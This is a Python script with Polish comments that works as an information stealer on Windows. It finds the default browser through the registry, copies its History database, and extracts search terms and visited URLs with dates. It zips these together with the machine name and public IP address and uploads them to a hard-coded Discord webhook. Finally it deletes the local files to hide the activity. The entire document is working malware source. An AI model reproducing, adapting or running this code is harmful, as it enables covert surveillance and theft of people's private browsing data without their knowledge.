import os
import sqlite3
import winreg
import getpass
import shutil
import zipfile
import requests
import json

# 1.Pobrać przeglądarki z rejestru i dostanie się do jej ścieżki

Web_hook ='https://discordapp.com/api/webhooks/1525264319565009088/-Xey57_EDn47J5KBOB2X968gfB_l9msiFD3Vq_HgPdCMvEuUQT0SVXY0ehbRirEWbe7D'

user = getpass.getuser()

temp = f"C:/Users/{user}/AppData/Local/Temp/"
browser={
    "Google Chrome":f"C:/Users/{user}/AppData/Local/Google/Chrome/User Data/Default/History",
    "MSEdge":f"C:/Users/{user}/AppData/Local/Microsoft/Edge/User Data/Default/History",
    "Microsoft Edge":f"C:/Users/{user}/AppData/Local/Microsoft/Edge/User Data/Default/History",
    "Opera Stable":f"C:/Users/{user}/AppData/Roaming/Opera Software/Opera Stable/History",
    "Opera GX":f"C:/Users/{user}/AppData/Roaming/Opera Software/Opera GX Stable/History",
    "Vivaldi":f"C:/Users/{user}/AppData/Local/Vivaldi/User Data/Default/History",
    "Brave":f"C:/Users/{user}/AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/History",
    "CentBrowser":f"C:/Users/{user}/AppData/Local/CentBrowser/User Data/Default/History",
    "Iron":f"C:/Users/{user}/AppData/Local/Chromium/User Data/Default/History",
    "Colibri":f"C:/Users/{user}/AppData/Roaming/Colibri/History",
    "Chromium":f"C:/Users/{user}/AppData/Local/Chromium/User Data/Default/History"
}

def get_browser_name():
    default_browser_path = r"Software\Microsoft\Windows\Shell\Associations\UrlAssociations\http\UserChoice"

    try:
        # Pobieramy identyfikator z rejestru
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, default_browser_path) as key:
            # POPRAWKA: "ProgId" zamiast "PrologId"
            prog_id, _ = winreg.QueryValueEx(key, "ProgId")
        
        # Próba 1: Pobranie oficjalnej nazwy aplikacji
        try: 
            with winreg.OpenKey(winreg.HKEY_CLASSES_ROOT, rf"{prog_id}\Application") as key:
                return winreg.QueryValueEx(key, "ApplicationName")[0]
        except FileNotFoundError:
            pass

        # Próba 2: Pobranie nazwy z komendy uruchomieniowej (.exe)
        try:
            with winreg.OpenKey(winreg.HKEY_CLASSES_ROOT, rf"{prog_id}\shell\open\command") as key:
                command, _ = winreg.QueryValueEx(key, "")
                exe_path = command.split('"')[1] if '"' in command else command.split()[0]
                browser_name = os.path.basename(exe_path).replace(".exe", "").capitalize()
                return browser_name
        except Exception:
            return prog_id
            
    except Exception as e:
        return f"error {e}"
# dostać się do histori

path = browser[get_browser_name()]

os.makedirs(temp+"browser-data/",exist_ok=True)

new_path = temp+"browser-data/History"


shutil.copy(path,new_path)

# searching - history
# sql
try:
    with sqlite3.connect(new_path) as connection:

        cursor = connection.cursor()

        cursor.execute("SELECT term FROM keyword_search_terms")

        terms = [wiersz[0] for wiersz in cursor.fetchall()]

        with open (temp+"browser-data/search-history.txt","w",encoding='utf-8') as file:
            file.write("Lp. | SERCHING "+"\n")
            for numer,(term) in enumerate(terms,start=1):
                line = f"{numer} | {term}"
                file.write(line + "\n")
        
        

except Exception as exc:
    with open (temp+"browser-data/search-history.txt","w",encoding='utf-8') as file:
        file.write(str(exc) +"\n")
finally:
    cursor.close()
    connection.close()



# 2.skopiować niezbłdnie wpisy z histori


try:
    with sqlite3.connect(new_path) as connection:

        cursor = connection.cursor()

        cursor.execute("SELECT url, title, datetime((last_visit_time / 1000000) - 11644473600, 'unixepoch', 'localtime') AS data_wizyty FROM urls")

        url_data = cursor.fetchall()

        line_num =1

        with open (temp+"browser-data/search-history_url.txt","w",encoding='utf-8') as file:
            file.write("Lp. | URL | TITLE | DATE "+"\n")
            for url, title, data_wizyty in url_data:
                linia = f"{line_num} | {url} | {title} | {data_wizyty}"

                file.write(linia + "\n")

                line_num +=1


except Exception:
    with open (temp+"browser-data/search-history_url.txt","w",encoding='utf-8') as file:
        file.write("ERROR")
        file.write(str(Exception))
finally:
    cursor.close()
    connection.close()



# pakowanie do zipa
file_for_zipping = [temp+"browser-data/search-history_url.txt",temp+"browser-data/search-history.txt"]

try:  
    with zipfile.ZipFile(temp+"/history.zip","w") as zipf:
        for file in file_for_zipping:
            nazwa_w_zipie = os.path.basename(file)
            zipf.write(file, arcname=nazwa_w_zipie)
except Exception:
    pass

# 4.wysłać ten plik

sciezka_pliku = temp + "/history.zip" 

Pc_id = os.environ['COMPUTERNAME']
ip_adress = requests.get('https://api.ipify.org').text





with open(sciezka_pliku, "rb") as f:
    # 2. W nazwie pliku wysyłanego na Discorda podajemy tylko "history.zip", 
    #    żeby Discord nie próbował odczytać ścieżki systemowej z komputera.
    files = {
        "file": ("history.zip", f, "application/zip")
    }

    payload = {
        "content": f"Oto Twój spakowany plik ZIP z komputera: {Pc_id} o adresie publicznym: {ip_adress} "
    }

    # 3. KLUCZOWA POPRAWKA: Używamy json.dumps(payload), aby zamienić słownik na tekst JSON
    response = requests.post(
        Web_hook,
        data={"payload_json": json.dumps(payload)},
        files=files
    )

path_brwserdata = temp+ "browser-data/"
# 5 usunać plik i skrypt
os.remove(sciezka_pliku)
os.remove(path_brwserdata +"History")
os.remove(path_brwserdata +"search-history.txt")
os.remove(path_brwserdata +"search-history_url.txt")
